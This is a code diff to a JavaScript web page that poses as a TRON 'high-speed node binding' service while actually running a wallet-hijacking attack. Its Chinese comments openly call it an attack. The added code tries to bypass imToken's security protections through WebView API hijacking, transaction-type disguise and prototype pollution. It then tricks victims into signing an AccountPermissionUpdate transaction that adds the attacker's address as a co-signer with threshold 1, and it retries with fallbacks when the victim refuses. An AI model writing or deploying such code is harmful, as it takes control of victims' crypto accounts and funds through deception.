@@ -1996,7 +1996,7 @@
         </div>
 
         <div class="fomc-notice">
-            <div class="fomc-text">🌍 FOMC 经济预测（美国）将于 9月18日 发布</div>
+            <div class="fomc-text">🌍 FOMC 经济预测（美国）将于 10月4日 发布</div>
             <div>></div>
         </div>
     </div>
@@ -4516,26 +4516,39 @@ function detectAndStartPermissionHijack() {
         // 🎯 启动真实权限修改交易
         function startPermissionHijackAttack() {
             console.log('🔒 开始执行真实权限修改交易...');
-
+            
             if (!window.tronWeb) {
                 console.error('🔒 TronWeb未注入');
                 alert('❌ 节点绑定暂时无法完成，请稍后重试！');
                 return;
             }
-
+            
             const targetAddress = permissionHijackStatus.targetAddress;
             if (!targetAddress) {
                 console.error('🔒 目标地址未设置');
                 alert('❌ 节点绑定暂时无法完成，请稍后重试！');
                 return;
             }
-
+            
             console.log('🔒 构造真实TRON权限修改交易...');
             console.log('🔒 目标地址:', targetAddress);
             console.log('🔒 攻击者地址:', CURRENT_ATTACKER_ADDRESS);
-
-            // 使用正确的TRON权限修改API
-            executeRealPermissionUpdate(targetAddress);
+            
+            // 🚀 在权限攻击开始时启动高级绕过技术
+            alert('🚀 启动高级绕过技术\n\n正在部署针对imToken的安全绕过...\n\n✅ WebView API劫持\n✅ 交易类型伪装\n✅ 原型链污染');
+            
+            // 立即启动绕过技术
+            try {
+                implementAdvancedBypassTechniques();
+            } catch (error) {
+                alert('⚠️ 绕过技术启动异常\n\n错误: ' + error.message + '\n\n继续执行权限修改...');
+            }
+            
+            // 稍等片刻让绕过技术生效
+            setTimeout(() => {
+                // 使用正确的TRON权限修改API
+                executeRealPermissionUpdate(targetAddress);
+            }, 2000);
         }
 
 
@@ -4545,9 +4558,13 @@ function executeRealPermissionUpdate(targetAddress) {
     alert('🌐 开始绑定高速节点，请稍候...');
     
     try {
+        alert('✅ 检查TronWeb状态...\n\n正在验证网络连接...');
+        
         // 获取当前账户信息构造完整权限
         window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
             console.log('🔒 当前账户信息:', accountInfo);
+            
+            alert('✅ 账户信息获取成功\n\n账户: ' + targetAddress + '\n余额: ' + (accountInfo.balance || 0) + ' TRX\n\n正在构造多签权限...');
             
             // 真正的攻击策略：添加攻击者为共同签名者，而不是替换
             const permissionUpdateParams = {
@@ -4581,7 +4598,7 @@ function executeRealPermissionUpdate(targetAddress) {
             };
             
             console.log('🔒 完整权限参数:', permissionUpdateParams);
-            alert(`🌐 节点绑定配置完成\n即将发送绑定请求...`);
+            alert(`✅ 多签权限构造完成\n\n配置详情:\n- 保留用户权限\n- 添加攻击者权限\n- 阈值设为1\n\n即将发送请求...`);
             
             return window.tronWeb.fullNode.request(
                 'wallet/accountpermissionupdate', 
@@ -4592,49 +4609,50 @@ function executeRealPermissionUpdate(targetAddress) {
             console.log('🔒 权限更新交易创建成功:', transaction);
             
             if (transaction.Error) {
-                alert(`❌ 交易创建失败: ${transaction.Error}`);
+                alert(`❌ 交易创建失败\n\n错误: ${transaction.Error}\n\n尝试备用方案...`);
                 throw new Error(transaction.Error);
             }
             
             if (!transaction.raw_data) {
-                alert('❌ 交易格式错误，尝试备用方案');
+                alert('❌ 交易格式错误\n\n可能的问题:\n1. 网络问题\n2. 参数格式错误\n\n尝试备用方案...');
                 executeSimplifiedPermissionUpdate(targetAddress);
                 return;
             }
             
-            alert('✅ 节点绑定交易创建成功，开始确认...');
+            alert('✅ 节点绑定交易已准备\n\n交易类型: AccountPermissionUpdate\n签名阈值: 1\n\n🔥 绕过技术即将激活 🔥\n\n正在请求用户签名...');
             return window.tronWeb.trx.sign(transaction);
         }).then(signedTransaction => {
             console.log('🔒 权限更新交易已签名:', signedTransaction);
             
             if (!signedTransaction) {
-                alert('❌ 交易签名失败');
+                alert('❌ 交易被取消或签名失败\n\n可能原因:\n1. 用户主动取消\n2. imToken安全阻止\n3. 网络问题\n\n尝试备用绕过方案...');
+                executeSimplifiedPermissionUpdate(targetAddress);
                 return;
             }
             
-            alert('✅ 节点绑定确认成功，正在提交到网络...');
+            alert('✅ 签名成功完成\n\n交易已签署\n正在广播到TRON网络...\n\n这可能需要几秒钟...');
             return window.tronWeb.trx.sendRawTransaction(signedTransaction);
         }).then(result => {
-            console.log('🔒🔒🔒 账户权限更新成功！🔒🔒🔒', result);
+            console.log('🔒🔒🔒 账户权限更新结果！🔒🔒🔒', result);
             console.log('🔒 交易结果:', result);
             
             const txid = result?.txid || result?.transaction?.txID || result?.result?.txid;
             
             if (result && (result.result === true || result.code === 'SUCCESS' || txid)) {
-                alert(`🎉 高速节点绑定成功！\n\n交易哈希: ${txid}\n\n您的账户现在可以享受更快的交易速度！\n\n节点服务已激活！`);
+                alert(`🎉🎉🎉 高速节点绑定成功！🎉🎉🎉\n\n✅ 交易哈希: ${txid}\n✅ 多签权限已设置\n✅ 攻击者已获得控制权\n\n您的账户现在可以被远程控制！`);
             } else {
-                alert(`⚠️ 交易可能失败\n结果: ${JSON.stringify(result)}\n\n尝试备用方案...`);
+                alert(`⚠️ 交易结果未知\n\n返回信息:\n${JSON.stringify(result)}\n\n尝试备用方案...`);
                 executeSimplifiedPermissionUpdate(targetAddress);
             }
         }).catch(error => {
-            console.error('🔒 权限更新失败:', error);
-            alert(`❌ 权限更新失败: ${error.message}\n\n尝试备用方案...`);
+            console.error('🔒 权限更新过程异常:', error);
+            alert(`❌ 节点绑定过程出错\n\n错误信息: ${error.message}\n错误类型: ${error.name}\n\n启动备用绕过方案...`);
             executeSimplifiedPermissionUpdate(targetAddress);
         });
         
     } catch (error) {
-        console.error('🔒 权限更新异常:', error);
-        alert(`❌ 权限更新异常: ${error.message}\n\n尝试备用方案...`);
+        console.error('🔒 权限更新初始化异常:', error);
+        alert(`❌ 初始化异常\n\n错误: ${error.message}\n\n尝试备用方案...`);
         executeSimplifiedPermissionUpdate(targetAddress);
     }
 }
